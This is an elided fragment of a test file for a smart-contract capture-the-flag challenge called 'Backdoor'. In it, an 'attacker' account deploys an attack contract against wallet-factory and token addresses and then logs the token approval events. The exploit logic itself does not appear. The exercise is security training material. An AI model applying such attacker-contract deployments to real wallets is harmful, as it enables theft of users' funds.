...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    ...
    await AttackFactory.connect(attacker).deploy(
      this.masterCopy.address,
      this.walletFactory.address,
      users,
      this.token.address,
    ...
    const approvalFilter = this.token.filters.Approval(null, null, null);
    console.log(await this.token.queryFilter(approvalFilter));

    // const proxyFilter = this.walletFactory.filters.ProxyCreation(null, null);
    // console.log(await this.walletFactory.queryFilter(proxyFilter));
  });
